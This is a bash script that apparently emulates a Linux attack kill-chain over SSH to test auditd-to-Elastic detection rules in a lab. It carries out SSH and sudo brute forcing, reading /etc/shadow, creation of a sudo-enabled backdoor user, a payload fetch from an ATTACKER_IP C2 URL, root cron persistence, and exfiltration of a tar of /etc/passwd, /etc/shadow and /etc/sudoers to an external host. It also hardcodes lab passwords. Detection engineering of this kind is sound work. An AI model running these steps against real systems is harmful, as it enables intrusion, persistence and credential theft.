#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# attack_target.sh — ONE end-to-end Linux attack kill-chain against an
# AUTHORIZED lab target.
#
# Runs a SINGLE coherent attack story over SSH so the TARGET's own
# auditd -> Elastic pipeline captures it on REAL telemetry and the multi-stage
# chain/ rules fire in a correlated way. The stages, in order:
#
#   1. Initial Access ....... SSH brute-force (failed logins) -> successful login
#                             chains 01->02->03
#   2. Discovery ............ post-compromise recon (whoami/id/uname + /tmp fetch)
#   3. Privilege Escalation . repeated failed sudo -> sudo success -> read /etc/shadow
#                             chains 19->20->21, 81->82
#   4. Persistence (account)  create backdoor user -> add to sudo -> first login
#                             chains 22->23->24
#   5. Persistence (malware)  download to /tmp -> execute from /tmp -> cron entry
#                             chains 09->10->11, 47->48
#   6. Collection & Exfil ... tar archive of secrets -> upload to EXTERNAL C2
#                             chains 51->52
#
# Tuned to the current (fixed) chain rules: >=5 failed sudo (R19 freq=4),
# archive *creation* with `tar -c` (R51), and exfil to a NON-RFC1918 / TEST-NET
# address (R52 now excludes private ranges). All actions are LAB-safe and
# reversible — created users, /tmp files, cron entries and the archive are
# removed by `cleanup`, and the exfil/C2 host is TEST-NET-3 (203.0.113.0/24,
# RFC 5737) which does not route anywhere.
#
# ⚠️  Use ONLY against systems you own / are authorized to test.
#
# Usage:
#   ./attack_target.sh                # runs against the lab defaults below
#   TARGET=10.10.x.x SSH_USER=user SSH_PASS=pass [SUDO_PASS=pass] ./attack_target.sh
#   TARGET=... SSH_USER=... SSH_KEY=~/.ssh/id_ed25519 ./attack_target.sh   # key auth
#   ./attack_target.sh cleanup        # remove all lab artifacts from the target
#
# Optional env: SSH_PORT, SSH_FAILS (default 8), SUDO_FAILS (default 5),
#               ES_URL, ES_AUTH (default the lab cluster, used by the detect step).
# ---------------------------------------------------------------------------
set -uo pipefail

# Lab defaults — override any of these via env (e.g. TARGET=10.10.x.x ./attack_target.sh)
TARGET="${TARGET:-10.10.10.60}"
SSH_USER="${SSH_USER:-netadmin}"
SSH_PASS="${SSH_PASS:-m0l3kula12345}"
SSH_KEY="${SSH_KEY:-}"
SSH_PORT="${SSH_PORT:-22}"
SUDO_PASS="${SUDO_PASS:-$SSH_PASS}"
SSH_FAILS="${SSH_FAILS:-8}"          # >= R01 threshold (freq 6)
SUDO_FAILS="${SUDO_FAILS:-5}"        # >= R19 threshold (freq 4)

# EXTERNAL (non-RFC1918) C2/exfil host — TEST-NET-3, does not route. R52 now
# excludes RFC1918, so exfil MUST target a public/TEST-NET address to be detected.
ATTACKER_IP="${ATTACKER_IP:-203.0.113.66}"
C2_URL="http://${ATTACKER_IP}:9999/shell.sh"
EXFIL_URL="http://${ATTACKER_IP}:9999/exfil"

ES_URL="${ES_URL:-http://10.10.10.60:9200}"; ES_AUTH="${ES_AUTH:-elastic:elasticpassword}"
NEWUSER="simbackdoor"; NEWPASS="SimP@ss123!"

if [ -z "$SSH_KEY" ] && [ -z "$SSH_PASS" ]; then
  echo "✋ set SSH_PASS=... (or SSH_KEY=/path/to/key) for $SSH_USER@$TARGET" >&2
  exit 2
fi

SOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -p $SSH_PORT"

# run a command ON the target as SSH_USER (key or password auth)
rsh(){
  if [ -n "$SSH_KEY" ]; then ssh -i "$SSH_KEY" $SOPTS "$SSH_USER@$TARGET" "$1"
  else sshpass -p "$SSH_PASS" ssh $SOPTS "$SSH_USER@$TARGET" "$1"; fi
}
# one FAILED password login (wrong creds) -> target logs an auth failure
fail_login(){
  sshpass -p "WrongPass_$1_$RANDOM" ssh $SOPTS \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o NumberOfPasswordPrompts=1 "$SSH_USER@$TARGET" exit >/dev/null 2>&1 || true
}

# ---------------------------------------------------------------------------
do_cleanup(){
  echo "🧹 removing lab artifacts on $TARGET"
  rsh "echo '$SUDO_PASS' | sudo -S -k userdel -r '$NEWUSER' 2>/dev/null; \
       echo '$SUDO_PASS' | sudo -S -k rm -f /tmp/sim_payload /tmp/sim_x /tmp/loot.tgz /etc/cron.d/sim_payload 2>/dev/null" || true
  echo "done."
}

run_killchain(){
  echo "🎯 target=$TARGET  user=$SSH_USER  (ONE full kill-chain — authorized lab testing only)"

  echo "── 1. Initial Access — SSH brute force ($SSH_FAILS failed logins) then login [chain 01→02→03]"
  for i in $(seq 1 "$SSH_FAILS"); do fail_login "$i"; done
  rsh "whoami; id; uname -a" >/dev/null 2>&1 || true

  echo "── 2. Discovery — post-compromise recon + tool fetch to /tmp"
  rsh "whoami; id; uname -a; wget -q -O /tmp/sim_x '$C2_URL' 2>/dev/null; rm -f /tmp/sim_x" >/dev/null 2>&1 || true

  echo "── 3. Privilege Escalation — $SUDO_FAILS failed sudo, then sudo success + read /etc/shadow [chain 19→20→21, 81→82]"
  rsh "for i in \$(seq 1 $SUDO_FAILS); do echo 'WrongSudoPass' | sudo -S -k id >/dev/null 2>&1; done; \
       echo '$SUDO_PASS' | sudo -S -k id >/dev/null 2>&1; \
       echo '$SUDO_PASS' | sudo -S -k cat /etc/shadow >/dev/null 2>&1" || true

  echo "── 4. Persistence (account) — create backdoor user, add to sudo, first login [chain 22→23→24]"
  rsh "echo '$SUDO_PASS' | sudo -S -k useradd -m '$NEWUSER' 2>/dev/null; \
       echo '$SUDO_PASS' | sudo -S -k usermod -aG sudo '$NEWUSER' 2>/dev/null; \
       echo '$NEWUSER:$NEWPASS' | sudo -S -k chpasswd 2>/dev/null" || true
  sshpass -p "$NEWPASS" ssh $SOPTS -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "$NEWUSER@$TARGET" "whoami" >/dev/null 2>&1 || true

  echo "── 5. Persistence (malware) — download to /tmp, execute from /tmp, cron entry [chain 09→10→11, 47→48]"
  rsh "wget -q -O /tmp/sim_payload '$C2_URL' 2>/dev/null; \
       printf '#!/bin/sh\necho sim-payload\n' > /tmp/sim_payload; chmod +x /tmp/sim_payload; /tmp/sim_payload >/dev/null 2>&1; \
       echo '* * * * * root /tmp/sim_payload' | sudo -S -k tee /etc/cron.d/sim_payload >/dev/null 2>&1" || true

  echo "── 6. Collection & Exfil — tar archive of secrets, upload to EXTERNAL C2 [chain 51→52]"
  rsh "echo '$SUDO_PASS' | sudo -S -k tar czf /tmp/loot.tgz /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null; \
       curl -s -m 5 --data-binary @/tmp/loot.tgz '$EXFIL_URL' >/dev/null 2>&1 || \
       wget -q -O /dev/null --post-file=/tmp/loot.tgz '$EXFIL_URL' >/dev/null 2>&1 || true" || true

  echo "✅ full kill-chain executed on $TARGET"
}

detect(){
  echo ""; echo "⏳ waiting 30s for the target's auditd -> Elastic ingest..."; sleep 30
  local hn; hn="$(rsh 'hostname' 2>/dev/null | tr -d '\r')"
  echo "🔎 events from host '$hn' in the last 15m (live telemetry):"
  ES_URL="$ES_URL" ES_AUTH="$ES_AUTH" python3 - "$hn" <<'PYEOF'
import sys, os, json, base64, urllib.request, urllib.error
hn=sys.argv[1]; auth=base64.b64encode(os.environ["ES_AUTH"].encode()).decode()
url=os.environ["ES_URL"].rstrip("/")+"/_query"
q=(f'FROM logs-updive.audit-* | WHERE @timestamp >= NOW() - 15 minutes '
   f'AND host.hostname == "{hn}" | STATS events=COUNT(*), '
   f'fails=COUNT_IF(auditd.result=="fail"), execs=COUNT_IF(event.action=="executed") '
   f'BY auditd.message_type | SORT events DESC | LIMIT 20')
req=urllib.request.Request(url,data=json.dumps({"query":q}).encode(),method="POST",
    headers={"Content-Type":"application/json","Authorization":"Basic "+auth})
try:
    d=json.load(urllib.request.urlopen(req,timeout=60)); v=d.get("values",[])
    if not v: print("   (no events yet — pipeline may be delayed or host not monitored)")
    for r in v: print("   ", r)
except urllib.error.HTTPError as e:
    print("   query error:", json.load(e).get("error",{}).get("reason","?")[:80])
PYEOF
}

case "${1:-}" in
  cleanup|--cleanup) do_cleanup; exit 0 ;;
  "" ) ;;
  * ) echo "usage: $0            # run the full kill-chain"; echo "       $0 cleanup    # remove lab artifacts"; exit 1 ;;
esac

run_killchain
detect
echo ""
echo "ℹ️  Reverse the lab changes when done:  TARGET=$TARGET SSH_USER=$SSH_USER SSH_PASS=*** $0 cleanup"
